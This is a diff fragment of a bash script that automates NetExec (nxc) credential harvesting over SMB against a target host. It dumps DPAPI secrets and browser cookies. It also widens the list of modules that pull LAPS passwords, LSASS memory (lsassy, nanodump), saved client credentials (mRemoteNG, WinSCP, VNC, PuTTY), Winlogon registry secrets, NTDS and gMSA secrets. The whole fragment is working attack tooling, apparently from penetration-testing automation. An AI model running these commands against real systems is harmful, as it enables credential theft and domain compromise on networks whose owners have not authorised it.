@@ -104,10 +104,8 @@ fi
 ## 2) DPAPI variants
 log "DPAPI base"
 nxc smb "$IP" "${BASE[@]}" --dpapi || true
-
 log "DPAPI cookies"
 nxc smb "$IP" "${BASE[@]}" --dpapi cookies || true
-
 log "DPAPI nosystem"
 nxc smb "$IP" "${BASE[@]}" --dpapi nosystem || true
 
@@ -119,8 +117,8 @@ else
 fi
 
 ## 3) Modules
-MODULES=(spider_plus gpp_password gpp_autologin wifi putty powershell_history lsassy rdcman backup_operator)
-LOCAL_ADMIN_MODULES=(sam lsa lsass)
+MODULES=(laps gpp_password gpp_autologin wifi putty powershell_history lsassy nanodump mremoteng notepad++ winscp vnc wifi reg-winlogon rdcman backup_operator)
+LOCAL_ADMIN_MODULES=(sam lsa lsass ntds gmsa)
 
 # Run local-admin only modules if not in domain mode
 if [[ "$MODE" == "local" ]]; then
